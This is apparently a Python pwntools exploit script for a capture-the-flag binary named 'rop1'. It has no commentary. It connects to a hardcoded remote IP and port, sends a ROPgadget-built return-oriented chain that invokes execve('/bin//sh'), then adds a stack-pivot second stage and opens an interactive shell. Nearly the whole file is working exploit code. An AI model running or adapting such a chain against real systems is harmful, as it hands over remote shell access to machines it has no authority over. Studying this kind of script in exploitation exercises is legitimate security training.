#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./rop1"
# elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3122)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    b *0x004009e5

    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'

# execve generated by ROPgadget
p = p64(0x0000000000401637) # pop rsi ; ret
p += p64(0x00000000006ca080) # @ .data
p += p64(0x0000000000478616) # pop rax ; pop rdx ; pop rbx ; ret
p += b'/bin//sh'
p += b'/bin//sh'
p += b'/bin//sh'
p += p64(0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000401637) # pop rsi ; ret
p += p64(0x00000000006ca088) # @ .data + 8
p += p64(0x00000000004260ef) # xor rax, rax ; ret
p += p64(0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000478616) # pop rax ; pop rdx ; pop rbx ; ret
p += p64(0x3b)
p += b'/bin//sh'
p += b'/bin//sh'
p += p64(0x0000000000401516) # pop rdi ; ret
p += p64(0x00000000006ca080) # @ .data
p += p64(0x0000000000401637) # pop rsi ; ret
p += p64(0x00000000006ca088) # @ .data + 8
p += p64(0x00000000004428e6) # pop rdx ; ret
p += p64(0x00000000006ca088) # @ .data + 8
p += p64(0x00000000004003da) # syscall

c.send(p)

# read Again
bss = 0x00000000006ca080
rbp = bss - 0x500
buf2 = 0x6ccd60 

p = b'a' * 0x28
p += p64(0x000000000040060b) # pop rsp ; ret
p += p64(buf2)
# p += p64(0x00000000004428e6) # pop rdx ; ret
#p += p64(0x400)
#p += p64(0x0000000000401637) # pop rsi ; ret
#p += p64(rbp) # @ .data + 8
#p += p64(0x4009c2) # func1 read


c.sendafter('size', p)




c.interactive()
c.close()
